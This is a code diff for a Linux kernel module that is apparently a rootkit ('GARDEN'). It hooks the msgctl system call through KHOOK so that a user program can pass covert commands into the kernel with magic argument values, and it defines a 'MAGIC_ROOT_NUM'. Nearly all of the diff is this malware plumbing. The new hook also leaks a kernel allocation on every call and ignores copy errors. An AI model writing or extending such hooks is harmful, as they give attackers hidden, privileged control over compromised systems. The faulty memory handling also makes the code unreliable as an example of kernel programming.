@@ -77,8 +77,8 @@ typedef struct action_task {
 
 #define POLLING_INTERVAL 1500
 #define MAGIC_ROOT_NUM 31337
+#define MAX_TASK_SIZE 200
 static _timer polling_timer;
-static bool incoming_command_flag = false;
 
 // Module parameters
 
@@ -116,51 +116,27 @@ void log_error(const char *message) {
 	printk(KERN_ERR "GARDEN: %s", message);
 }
 
-// bool check_struct_is_null(struct msqid_ds __user* s) {
-// 	return s->msg_stime == 0;
-// 	// struct msqid_ds {
-//     //            struct ipc_perm msg_perm;     /* Ownership and permissions */
-//     //            time_t          msg_stime;    /* Time of last msgsnd(2) */
-//     //            time_t          msg_rtime;    /* Time of last msgrcv(2) */
-//     //            time_t          msg_ctime;    /* Time of last change */
-//     //            unsigned long   __msg_cbytes; /* Current number of bytes in
-//     //                                             queue (nonstandard) */
-//     //            msgqnum_t       msg_qnum;     /* Current number of messages
-//     //                                             in queue */
-//     //            msglen_t        msg_qbytes;   /* Maximum number of bytes
-//     //                                             allowed in queue */
-//     //            pid_t           msg_lspid;    /* PID of last msgsnd(2) */
-//     //            pid_t           msg_lrpid;    /* PID of last msgrcv(2) */
-//     //        };
-// 	// if (s->)
-// }
-
 /**
  * Hook for communication with kernel from user program. If both msqid and cmd
  * are -1 and buf is a NULL pointer, the next call to this function is a command.
  * If incoming_command_flag is set, and both msqid and cmd are -1, the
  * msquid_ds struct should be cast to an action_task * and processed.
  */
-KHOOK_EXT(long, __x64_ksys_msgctl, const struct pt_regs *);
-static long khook___x64_ksys_msgctl(const struct pt_regs * regs) {
-	// int msqid, int cmd, struct msqid_ds __user *buf
+KHOOK_EXT(long, __x64_sys_msgctl, const struct pt_regs *);
+static long khook___x64_sys_msgctl(const struct pt_regs *regs) {
 	action_task* task;
+	task = kmalloc(MAX_TASK_SIZE + 1, GFP_KERNEL);
+	printk("%s -- msqid:%ld cmd:%ld ptr:%p\n", current->comm, regs->di, regs->si, (void *)regs->dx);
+	// int msqid, int cmd, struct msqid_ds __user *buf
+
 	// Read first two arguments
-	if (regs->di == -1 && regs->si == -1) {
-		if (!incoming_command_flag) { // Prepare for incoming command.
-			printk(KERN_EMERG "sys_msgctl -- preparing for incoming command\n");
-			incoming_command_flag = true;
-			return 0;
-		} else { // This is a command.
-			printk(KERN_EMERG "sys_msgctl -- Command found\n");
-			// copy_from_user
-			task = (action_task*) regs->dx;
+	if (regs->di == INT_MAX && regs->si == INT_MAX) {
+			printk(KERN_EMERG "sys_msgctl --Incoming command\n");
+			copy_from_user(task, (const void*) regs->dx, MAX_TASK_SIZE);
 			printk(KERN_EMERG "FUNC CODE: %d\n", task->func_code);
 			return 0;
-		}
 	} else {
-		incoming_command_flag = false;
-		return KHOOK_ORIGIN(__x64_ksys_msgctl, regs);
+		return KHOOK_ORIGIN(__x64_sys_msgctl, regs);
 	}
 }
 
